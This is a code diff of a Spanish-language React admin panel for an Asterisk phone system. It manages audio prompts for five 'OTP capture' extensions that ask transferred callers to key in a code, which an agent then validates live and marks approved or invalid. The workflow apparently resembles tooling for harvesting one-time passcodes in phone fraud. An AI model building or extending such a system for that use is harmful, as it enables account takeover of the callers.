-          body: JSON.stringify({
-            name: newAudioItem.name,
-            fileName: `${baseName}.wav`,
-            category: 'welcome_3333',
-            dataUrl: dataUrl,
-          }),
-        });
-
-        await handleAssignRoleDirect('welcome_3333', cleanPath);
-        if (onAssignTo3333) {
-          onAssignTo3333(newAudioItem.id);
-        }
-
-        setFeedbackMsg({
-          text: `¡Audio para la Extensión 3333 cargado y activo con éxito en Asterisk! Al transferir a la 3333 o 333 se reproducirá de inmediato.`,
-          type: 'success',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } catch (err: any) {
-        console.error('Error subiendo audio 3333:', err);
-        setFeedbackMsg({
-          text: `Error al subir el audio para la 3333: ${err.message}`,
-          type: 'info',
-        });
-        setTimeout(() => setFeedbackMsg(null), 5000);
-      } finally {
-        setIsUploading3333(false);
-      }
-    };
-    reader.readAsDataURL(file);
-  };
-
-  const categoryLabels: Record<AudioPrompt['category'], { label: string; color: string }> = {
+  const categoryLabels: Record<string, { label: string; color: string }> = {
     welcome_7777: { label: 'Bienvenida Extensión 7777', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20 font-bold' },
     welcome_6666: { label: 'Bienvenida Extensión 6666', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20 font-bold' },
     welcome_5555: { label: 'Bienvenida Extensión 5555', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20 font-bold' },
@@ -998,727 +1161,314 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         </div>
       )}
 
-      {/* SECTION 1: PANELES DESTACADOS PARA EXTENSIONES 7777, 6666, 5555, 4444 Y 3333 */}
-      <div className="space-y-4">
-        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-slate-900/90 p-3.5 rounded-xl border border-slate-800">
-          <div className="flex items-center gap-2.5">
-            <div className="w-8 h-8 rounded-lg bg-indigo-500/20 border border-indigo-500/30 flex items-center justify-center text-indigo-300">
-              <Headphones className="w-4 h-4" />
+      {/* SECTION 1: DIVISIÓN INDIVIDUAL DE AUDIOS PARA EXTENSIONES DE CAPTURA OTP */}
+      <div className="space-y-6">
+        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 bg-slate-900/90 p-4 rounded-2xl border border-slate-800 shadow-lg">
+          <div className="flex items-start gap-3">
+            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500/20 to-purple-500/20 border border-indigo-500/40 flex items-center justify-center text-indigo-300 shrink-0 shadow-inner">
+              <Layers className="w-5 h-5 text-indigo-400" />
             </div>
             <div>
-              <h3 className="text-sm font-bold text-white">
-                Extensiones Dedicadas de Captura en Vivo (7777, 6666, 5555, 4444 y 3333)
-              </h3>
-              <p className="text-xs text-slate-400">
-                Transfiere la llamada del cliente a cualquiera de las extensiones <strong className="text-purple-300">7777</strong>, <strong className="text-cyan-300">6666</strong>, <strong className="text-amber-300">5555</strong>, <strong className="text-emerald-300">4444</strong> o <strong className="text-pink-300">3333</strong>. Todas capturan el código con validación del agente y cuentan con locuciones 100% independientes.
+              <div className="flex items-center gap-2 flex-wrap">
+                <h3 className="text-base font-bold text-white">
+                  División Individual de Audios para Extensiones de Captura OTP
+                </h3>
+                <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
+                  Sin cruces ni confusiones
+                </span>
+              </div>
+              <p className="text-xs text-slate-400 mt-1 max-w-3xl">
+                Cada extensión (<strong className="text-purple-300">7777 / 777</strong>, <strong className="text-cyan-300">6666 / 666</strong>, <strong className="text-amber-300">5555 / 555</strong>, <strong className="text-emerald-300">4444 / 444</strong> y <strong className="text-pink-300">3333 / 333</strong>) está completamente aislada en Asterisk AstDB con sus 4 audios individuales: <span className="text-slate-200">1. Solicitud OTP</span>, <span className="text-slate-200">2. Espera de Validación</span>, <span className="text-slate-200">3. Aprobado</span> y <span className="text-slate-200">4. Inválido</span>.
               </p>
             </div>
           </div>
-          <div className="flex items-center gap-2 self-start sm:self-auto flex-wrap">
+
+          <div className="flex flex-wrap items-center gap-2 self-start lg:self-auto shrink-0">
             <button
               onClick={handleSaveOtpExtensions}
               disabled={isSavingOtpExtensions}
-              className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shadow-md ${
-                otpExtensionsSaved
-                  ? 'bg-emerald-500 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
-                  : 'bg-gradient-to-r from-purple-600 via-emerald-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-purple-600/20'
+              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg active:scale-95 cursor-pointer ${
+                otpExtensionsSaved || (isExtLocked('7777') && isExtLocked('6666') && isExtLocked('5555') && isExtLocked('4444') && isExtLocked('3333'))
+                  ? 'bg-emerald-500 hover:bg-emerald-400 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
+                  : 'bg-gradient-to-r from-purple-600 via-indigo-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-indigo-600/30'
               }`}
-              title="Guardar y bloquear permanentemente las locuciones de todas las extensiones OTP para que no cambien al sincronizar el sistema"
+              title="Guardar y blindar todas las extensiones OTP contra sobreescritura automática"
             >
-              {otpExtensionsSaved ? <Check className="w-3.5 h-3.5 text-black" /> : <Lock className="w-3.5 h-3.5" />}
-              <span>{isSavingOtpExtensions ? 'Guardando en AstDB...' : otpExtensionsSaved ? '¡Configuración Bloqueada!' : 'Guardar y Bloquear Extensiones OTP'}</span>
+              {isSavingOtpExtensions ? (
+                <RefreshCw className="w-4 h-4 animate-spin" />
+              ) : otpExtensionsSaved || (isExtLocked('7777') && isExtLocked('6666')) ? (
+                <ShieldCheck className="w-4 h-4" />
+              ) : (
+                <Save className="w-4 h-4" />
+              )}
+              <span>
+                {isSavingOtpExtensions
+                  ? 'Blindando todas en AstDB...'
+                  : otpExtensionsSaved
+                  ? '¡Todas las Exts. Blindadas!'
+                  : 'Guardar y Blindar Todas las Exts. OTP'}
+              </span>
             </button>
-
-            {/* Menú de selección individual de extensiones */}
-            <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs flex-wrap">
-              <button
-                onClick={() => setFeaturedExtTab('all')}
-                className={`px-2.5 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === 'all'
-                    ? 'bg-indigo-600 text-white font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-white'
-                }`}
-              >
-                Ver Todas (5)
-              </button>
-              <button
-                onClick={() => setFeaturedExtTab('7777')}
-                className={`px-2.5 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === '7777'
-                    ? 'bg-purple-600 text-white font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-purple-300'
-                }`}
-              >
-                Ext. 7777
-              </button>
-              <button
-                onClick={() => setFeaturedExtTab('6666')}
-                className={`px-2.5 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === '6666'
-                    ? 'bg-cyan-600 text-white font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-cyan-300'
-                }`}
-              >
-                Ext. 6666
-              </button>
-              <button
-                onClick={() => setFeaturedExtTab('5555')}
-                className={`px-2.5 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === '5555'
-                    ? 'bg-amber-600 text-white font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-amber-300'
-                }`}
-              >
-                Ext. 5555
-              </button>
-              <button
-                onClick={() => setFeaturedExtTab('4444')}
-                className={`px-2.5 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === '4444'
-                    ? 'bg-emerald-600 text-white font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-emerald-300'
-                }`}
-              >
-                Ext. 4444
-              </button>
-              <button
-                onClick={() => setFeaturedExtTab('3333')}
-                className={`px-2.5 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === '3333'
-                    ? 'bg-pink-600 text-white font-bold shadow-sm'
-                    : 'text-slate-400 hover:text-pink-300'
-                }`}
-              >
-                Ext. 3333
-              </button>
-            </div>
           </div>
         </div>
 
-        {/* PANEL EXTENSIÓN 7777 */}
-        {(featuredExtTab === 'all' || featuredExtTab === '7777') && (
-          <div className="p-6 rounded-2xl bg-gradient-to-br from-purple-950/50 via-slate-900 to-slate-950 border-2 border-purple-500/50 shadow-xl space-y-4">
-            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-purple-500/20">
-              <div className="flex items-start gap-3">
-                <div className="w-11 h-11 rounded-xl bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 shrink-0 shadow-inner">
-                  <Headphones className="w-6 h-6" />
-                </div>
-                <div>
-                  <div className="flex items-center gap-2">
-                    <h3 className="text-base font-bold text-white">
-                      Audio Exclusivo para Extensión 7777 / 777
-                    </h3>
-                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-purple-500 text-white shadow-sm">
-                      Captura OTP Primaria
-                    </span>
-                  </div>
-                  <p className="text-xs text-purple-200/80 mt-1">
-                    Audio reproducido al cliente cuando transfieres a la 7777: <span className="font-semibold text-white">"Por favor digite su código seguido de la tecla de número (#)"</span>.
-                  </p>
-                </div>
-              </div>
+        {/* Barra selectora de vistas: Ver Todas o seleccionar extensión individual */}
+        <div className="flex items-center justify-between gap-3 bg-slate-950/70 p-2 rounded-xl border border-slate-800/80 overflow-x-auto">
+          <div className="flex items-center gap-1.5 text-xs">
+            <span className="text-slate-400 font-semibold px-2 hidden sm:inline">Filtrar Extensión:</span>
+            <button
+              onClick={() => setFeaturedExtTab('all')}
+              className={`px-3 py-1.5 rounded-lg transition-all font-bold flex items-center gap-1.5 cursor-pointer ${
+                featuredExtTab === 'all'
+                  ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/30'
+                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
+              }`}
+            >
+              <Layers className="w-3.5 h-3.5" />
+              <span>Ver Todas (5)</span>
+            </button>
 
-              <div className="flex items-center gap-2 shrink-0">
-                <input
-                  type="file"
-                  ref={ext7777FileInputRef}
-                  onChange={(e) => {
-                    if (e.target.files && e.target.files[0]) {
-                      handleUpload7777Direct(e.target.files[0]);
-                    }
-                  }}
-                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
-                  className="hidden"
-                />
+            {OTP_EXTENSIONS_CONFIG.map((extInfo) => {
+              const active = featuredExtTab === extInfo.extension;
+              const locked = isExtLocked(extInfo.extension);
+              return (
                 <button
-                  onClick={() => ext7777FileInputRef.current?.click()}
-                  disabled={isUploading7777}
-                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-purple-500 hover:bg-purple-400 text-white shadow-lg shadow-purple-500/30 transition-all transform active:scale-95 disabled:opacity-50"
+                  key={extInfo.id}
+                  onClick={() => setFeaturedExtTab(extInfo.extension as any)}
+                  className={`px-3 py-1.5 rounded-lg transition-all font-bold flex items-center gap-1.5 cursor-pointer ${
+                    active
+                      ? `${extInfo.badgeColor} shadow-md`
+                      : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
+                  }`}
                 >
-                  <UploadCloud className="w-4 h-4" />
-                  <span>{isUploading7777 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 7777'}</span>
+                  <span>Ext. {extInfo.extension}</span>
+                  <span className="text-[10px] opacity-80 font-normal">({extInfo.shortExt})</span>
+                  {locked && <Lock className="w-3 h-3 text-amber-400" />}
                 </button>
-              </div>
-            </div>
-
-            {/* Zona de estado y selector rápido para la 7777 */}
-            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
-              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-purple-500/30 space-y-2.5">
-                <div className="flex items-center justify-between text-xs">
-                  <span className="text-slate-300 font-semibold">Audio asignado a la 7777 / 777:</span>
-                  <span className="font-mono text-purple-300 font-bold bg-purple-950/60 px-2 py-0.5 rounded border border-purple-800/50">
-                    {activeAssignments.welcome_7777 || 'custom/bienvenida_7777'}
-                  </span>
-                </div>
-
-                <div className="flex items-center gap-2">
-                  <select
-                    value={activeAssignments.welcome_7777 || 'custom/bienvenida_7777'}
-                    disabled={isSyncingRole.welcome_7777}
-                    onChange={(e) => handleAssignRoleDirect('welcome_7777', e.target.value)}
-                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-purple-500/40 text-slate-100 text-xs font-mono focus:border-purple-400 focus:outline-none"
-                  >
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>
-                        {a.name} ({a.asteriskPath})
-                      </option>
-                    ))}
-                  </select>
-
-                  <button
-                    onClick={() => handlePlayByPath(activeAssignments.welcome_7777 || 'custom/bienvenida_7777')}
-                    className="px-3.5 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-purple-600/20"
-                    title="Escuchar audio actual de la 7777"
-                  >
-                    <Play className="w-3.5 h-3.5" />
-                    <span>Escuchar</span>
-                  </button>
-
-                  <button
-                    onClick={() => handleDeactivateRole('welcome_7777')}
-                    disabled={isSyncingRole.welcome_7777}
-                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
-                    title="Desactivar audio actual y restaurar locución predeterminada para la 7777"
-                  >
-                    <PowerOff className="w-3.5 h-3.5" />
-                    <span className="hidden sm:inline">Desactivar</span>
-                  </button>
-                </div>
-
-                <div className="flex items-center justify-between text-[11px] text-slate-400">
-                  <span className="flex items-center gap-1.5 text-emerald-400">
-                    <CheckCircle2 className="w-3.5 h-3.5" />
-                    <span>AstDB: ivr_vars 7777_intro y ivr_vars 7777_prompt</span>
-                  </span>
-                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
-                </div>
-              </div>
-
-              <div
-                onDragOver={(e) => {
-                  e.preventDefault();
-                  setIsDragging(true);
-                }}
-                onDragLeave={() => setIsDragging(false)}
-                onDrop={(e) => {
-                  e.preventDefault();
-                  setIsDragging(false);
-                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-                    handleUpload7777Direct(e.dataTransfer.files[0]);
-                  }
-                }}
-                onClick={() => ext7777FileInputRef.current?.click()}
-                className="p-4 rounded-xl border-2 border-dashed border-purple-500/40 bg-purple-950/20 hover:bg-purple-950/40 hover:border-purple-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
-              >
-                <UploadCloud className="w-6 h-6 text-purple-400" />
-                <div className="text-xs font-bold text-white">Arrastra el audio de la 7777 aquí</div>
-                <p className="text-[10px] text-purple-300/70 leading-tight">
-                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
-                </p>
-              </div>
-            </div>
+              );
+            })}
           </div>
-        )}
 
-        {/* PANEL EXTENSIÓN 6666 */}
-        {(featuredExtTab === 'all' || featuredExtTab === '6666') && (
-          <div className="p-6 rounded-2xl bg-gradient-to-br from-cyan-950/50 via-slate-900 to-slate-950 border-2 border-cyan-500/50 shadow-xl space-y-4">
-            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-cyan-500/20">
-              <div className="flex items-start gap-3">
-                <div className="w-11 h-11 rounded-xl bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-300 shrink-0 shadow-inner">
-                  <Headphones className="w-6 h-6" />
-                </div>
-                <div>
-                  <div className="flex items-center gap-2">
-                    <h3 className="text-base font-bold text-white">
-                      Audio Exclusivo para Extensión 6666 / 666
-                    </h3>
-                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-cyan-500 text-black shadow-sm">
-                      Extensión OTP 6666
-                    </span>
+          <div className="text-[11px] text-slate-400 hidden xl:flex items-center gap-1.5 px-2">
+            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span>Marcación Asterisk aislada por variable de canal</span>
+          </div>
+        </div>
+
+        {/* PANELES DE EXTENSIONES OTP (7777, 6666, 5555, 4444, 3333) */}
+        {OTP_EXTENSIONS_CONFIG.filter(
+          (extInfo) => featuredExtTab === 'all' || featuredExtTab === extInfo.extension
+        ).map((extInfo) => {
+          const locked = isExtLocked(extInfo.extension);
+          const isSaving = isSavingExt[extInfo.extension];
+
+          return (
+            <div
+              key={extInfo.id}
+              className={`p-6 rounded-2xl bg-gradient-to-br ${extInfo.bgGradient} border-2 ${extInfo.borderColor} shadow-2xl space-y-5 transition-all`}
+            >
+              {/* Encabezado de la Extensión */}
+              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-slate-700/50">
+                <div className="flex items-start gap-3.5">
+                  <div
+                    className={`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 shadow-inner border ${extInfo.accentBg}`}
+                  >
+                    <Headphones className="w-6 h-6" />
                   </div>
-                  <p className="text-xs text-cyan-200/80 mt-1">
-                    Audio reproducido al cliente cuando transfieres a la 6666: <span className="font-semibold text-white">Locución personalizada con misma lógica y flujo de validación</span>.
-                  </p>
-                </div>
-              </div>
-
-              <div className="flex items-center gap-2 shrink-0">
-                <input
-                  type="file"
-                  ref={ext6666FileInputRef}
-                  onChange={(e) => {
-                    if (e.target.files && e.target.files[0]) {
-                      handleUpload6666Direct(e.target.files[0]);
-                    }
-                  }}
-                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
-                  className="hidden"
-                />
-                <button
-                  onClick={() => ext6666FileInputRef.current?.click()}
-                  disabled={isUploading6666}
-                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-cyan-500 hover:bg-cyan-400 text-black shadow-lg shadow-cyan-500/30 transition-all transform active:scale-95 disabled:opacity-50"
-                >
-                  <UploadCloud className="w-4 h-4" />
-                  <span>{isUploading6666 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 6666'}</span>
-                </button>
-              </div>
-            </div>
-
-            {/* Zona de estado y selector rápido para la 6666 */}
-            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
-              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-cyan-500/30 space-y-2.5">
-                <div className="flex items-center justify-between text-xs">
-                  <span className="text-slate-300 font-semibold">Audio asignado a la 6666 / 666:</span>
-                  <span className="font-mono text-cyan-300 font-bold bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800/50">
-                    {activeAssignments.welcome_6666 || 'custom/bienvenida_6666'}
-                  </span>
-                </div>
-
-                <div className="flex items-center gap-2">
-                  <select
-                    value={activeAssignments.welcome_6666 || 'custom/bienvenida_6666'}
-                    disabled={isSyncingRole.welcome_6666}
-                    onChange={(e) => handleAssignRoleDirect('welcome_6666', e.target.value)}
-                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-cyan-500/40 text-slate-100 text-xs font-mono focus:border-cyan-400 focus:outline-none"
-                  >
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>
-                        {a.name} ({a.asteriskPath})
-                      </option>
-                    ))}
-                  </select>
-
-                  <button
-                    onClick={() => handlePlayByPath(activeAssignments.welcome_6666 || 'custom/bienvenida_6666')}
-                    className="px-3.5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-black text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-cyan-600/20"
-                    title="Escuchar audio actual de la 6666"
-                  >
-                    <Play className="w-3.5 h-3.5" />
-                    <span>Escuchar</span>
-                  </button>
-
-                  <button
-                    onClick={() => handleDeactivateRole('welcome_6666')}
-                    disabled={isSyncingRole.welcome_6666}
-                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
-                    title="Desactivar audio actual y restaurar locución predeterminada para la 6666"
-                  >
-                    <PowerOff className="w-3.5 h-3.5" />
-                    <span className="hidden sm:inline">Desactivar</span>
-                  </button>
-                </div>
-
-                <div className="flex items-center justify-between text-[11px] text-slate-400">
-                  <span className="flex items-center gap-1.5 text-emerald-400">
-                    <CheckCircle2 className="w-3.5 h-3.5" />
-                    <span>AstDB: ivr_vars 6666_intro y ivr_vars 6666_prompt</span>
-                  </span>
-                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
-                </div>
-              </div>
-
-              <div
-                onDragOver={(e) => {
-                  e.preventDefault();
-                  setIsDragging(true);
-                }}
-                onDragLeave={() => setIsDragging(false)}
-                onDrop={(e) => {
-                  e.preventDefault();
-                  setIsDragging(false);
-                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-                    handleUpload6666Direct(e.dataTransfer.files[0]);
-                  }
-                }}
-                onClick={() => ext6666FileInputRef.current?.click()}
-                className="p-4 rounded-xl border-2 border-dashed border-cyan-500/40 bg-cyan-950/20 hover:bg-cyan-950/40 hover:border-cyan-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
-              >
-                <UploadCloud className="w-6 h-6 text-cyan-400" />
-                <div className="text-xs font-bold text-white">Arrastra el audio de la 6666 aquí</div>
-                <p className="text-[10px] text-cyan-300/70 leading-tight">
-                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
-                </p>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* PANEL EXTENSIÓN 5555 */}
-        {(featuredExtTab === 'all' || featuredExtTab === '5555') && (
-          <div className="p-6 rounded-2xl bg-gradient-to-br from-amber-950/50 via-slate-900 to-slate-950 border-2 border-amber-500/50 shadow-xl space-y-4">
-            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-amber-500/20">
-              <div className="flex items-start gap-3">
-                <div className="w-11 h-11 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-300 shrink-0 shadow-inner">
-                  <Headphones className="w-6 h-6" />
-                </div>
-                <div>
-                  <div className="flex items-center gap-2">
-                    <h3 className="text-base font-bold text-white">
-                      Audio Exclusivo para Extensión 5555 / 555
-                    </h3>
-                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-amber-500 text-slate-950 shadow-sm">
-                      Extensión OTP 5555
-                    </span>
+                  <div>
+                    <div className="flex items-center gap-2 flex-wrap">
+                      <h4 className="text-lg font-extrabold text-white">
+                        Extensión {extInfo.extension} <span className="text-sm font-normal text-slate-300">/ Marcación Corta: {extInfo.shortExt}</span>
+                      </h4>
+                      <span className={`px-2.5 py-0.5 rounded-full text-xs font-bold ${extInfo.badgeColor} shadow-sm`}>
+                        {extInfo.badge}
+                      </span>
+                      {locked ? (
+                        <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40">
+                          <Lock className="w-3 h-3 text-amber-400" />
+                          <span>Blindado e Inmutable</span>
+                        </span>
+                      ) : (
+                        <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-medium bg-slate-800 text-slate-300 border border-slate-700">
+                          <Unlock className="w-3 h-3 text-slate-400" />
+                          <span>Desbloqueado</span>
+                        </span>
+                      )}
+                    </div>
+                    <p className="text-xs text-slate-300 mt-1">
+                      {extInfo.purpose}
+                    </p>
                   </div>
-                  <p className="text-xs text-amber-200/80 mt-1">
-                    Audio reproducido al cliente cuando transfieres a la 5555: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
-                  </p>
-                </div>
-              </div>
-
-              <div className="flex items-center gap-2 shrink-0">
-                <input
-                  type="file"
-                  ref={ext5555FileInputRef}
-                  onChange={(e) => {
-                    if (e.target.files && e.target.files[0]) {
-                      handleUpload5555Direct(e.target.files[0]);
-                    }
-                  }}
-                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
-                  className="hidden"
-                />
-                <button
-                  onClick={() => ext5555FileInputRef.current?.click()}
-                  disabled={isUploading5555}
-                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/30 transition-all transform active:scale-95 disabled:opacity-50"
-                >
-                  <UploadCloud className="w-4 h-4" />
-                  <span>{isUploading5555 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 5555'}</span>
-                </button>
-              </div>
-            </div>
-
-            {/* Zona de estado y selector rápido para la 5555 */}
-            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
-              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-amber-500/30 space-y-2.5">
-                <div className="flex items-center justify-between text-xs">
-                  <span className="text-slate-300 font-semibold">Audio asignado a la 5555 / 555:</span>
-                  <span className="font-mono text-amber-300 font-bold bg-amber-950/60 px-2 py-0.5 rounded border border-amber-800/50">
-                    {activeAssignments.welcome_5555 || 'custom/bienvenida_5555'}
-                  </span>
                 </div>
 
-                <div className="flex items-center gap-2">
-                  <select
-                    value={activeAssignments.welcome_5555 || 'custom/bienvenida_5555'}
-                    disabled={isSyncingRole.welcome_5555}
-                    onChange={(e) => handleAssignRoleDirect('welcome_5555', e.target.value)}
-                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-amber-500/40 text-slate-100 text-xs font-mono focus:border-amber-400 focus:outline-none"
-                  >
-                    {audios.map((a) => (
-                      <option key={a.id} value={a.asteriskPath}>
-                        {a.name} ({a.asteriskPath})
-                      </option>
-                    ))}
-                  </select>
-
+                {/* Botones de Blindaje y Desbloqueo individuales */}
+                <div className="flex items-center gap-2 shrink-0">
                   <button
-                    onClick={() => handlePlayByPath(activeAssignments.welcome_5555 || 'custom/bienvenida_5555')}
-                    className="px-3.5 py-2 rounded-lg bg-amber-600 hover:bg-amber-500 text-slate-950 text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-amber-600/20"
-                    title="Escuchar audio actual de la 5555"
+                    type="button"
+                    onClick={() => handleSaveConfigExtension(extInfo.extension)}
+                    disabled={isSaving}
+                    className="px-3.5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white text-xs font-bold flex items-center gap-1.5 shadow-lg shadow-emerald-600/30 transition-all cursor-pointer disabled:opacity-50"
+                    title={`Guardar y fijar permanentemente los 4 audios de la extensión ${extInfo.extension} en AstDB`}
                   >
-                    <Play className="w-3.5 h-3.5" />
-                    <span>Escuchar</span>
+                    {isSaving ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Save className="w-3.5 h-3.5" />}
+                    <span>{isSaving ? 'Guardando en AstDB...' : `Guardar y Blindar Ext. ${extInfo.extension}`}</span>
                   </button>
 
-                  <button
-                    onClick={() => handleDeactivateRole('welcome_5555')}
-                    disabled={isSyncingRole.welcome_5555}
-                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
-                    title="Desactivar audio actual y restaurar locución predeterminada para la 5555"
-                  >
-                    <PowerOff className="w-3.5 h-3.5" />
-                    <span className="hidden sm:inline">Desactivar</span>
-                  </button>
-                </div>
-
-                <div className="flex items-center justify-between text-[11px] text-slate-400">
-                  <span className="flex items-center gap-1.5 text-emerald-400">
-                    <CheckCircle2 className="w-3.5 h-3.5" />
-                    <span>AstDB: ivr_vars 5555_intro y ivr_vars 5555_prompt</span>
-                  </span>
-                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
+                  {locked && (
+                    <button
+                      type="button"
+                      onClick={() => handleUnlockExtension(extInfo.extension)}
+                      className="px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 active:scale-95 text-amber-300 hover:text-white border border-amber-500/30 text-xs font-semibold flex items-center gap-1.5 transition-all cursor-pointer"
+                      title="Desbloquear para permitir ajustes automáticos"
+                    >
+                      <Unlock className="w-3.5 h-3.5" />
+                      <span>Desbloquear</span>
+                    </button>
+                  )}
                 </div>
               </div>
 
-              <div
-                onDragOver={(e) => {
-                  e.preventDefault();
-                  setIsDragging(true);
-                }}
-                onDragLeave={() => setIsDragging(false)}
-                onDrop={(e) => {
-                  e.preventDefault();
-                  setIsDragging(false);
-                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-                    handleUpload5555Direct(e.dataTransfer.files[0]);
-                  }
-                }}
-                onClick={() => ext5555FileInputRef.current?.click()}
-                className="p-4 rounded-xl border-2 border-dashed border-amber-500/40 bg-amber-950/20 hover:bg-amber-950/40 hover:border-amber-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
-              >
-                <UploadCloud className="w-6 h-6 text-amber-400" />
-                <div className="text-xs font-bold text-white">Arrastra el audio de la 5555 aquí</div>
-                <p className="text-[10px] text-amber-300/70 leading-tight">
-                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
-                </p>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* PANEL EXTENSIÓN 4444 */}
-        {(featuredExtTab === 'all' || featuredExtTab === '4444') && (
-          <div className="p-6 rounded-2xl bg-gradient-to-br from-emerald-950/50 via-slate-900 to-slate-950 border-2 border-emerald-500/50 shadow-xl space-y-4">
-            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-emerald-500/20">
-              <div className="flex items-start gap-3">
-                <div className="w-11 h-11 rounded-xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-300 shrink-0 shadow-inner">
-                  <Headphones className="w-6 h-6" />
-                </div>
-                <div>
-                  <div className="flex items-center gap-2">
-                    <h3 className="text-base font-bold text-white">
-                      Audio Exclusivo para Extensión 4444 / 444
-                    </h3>
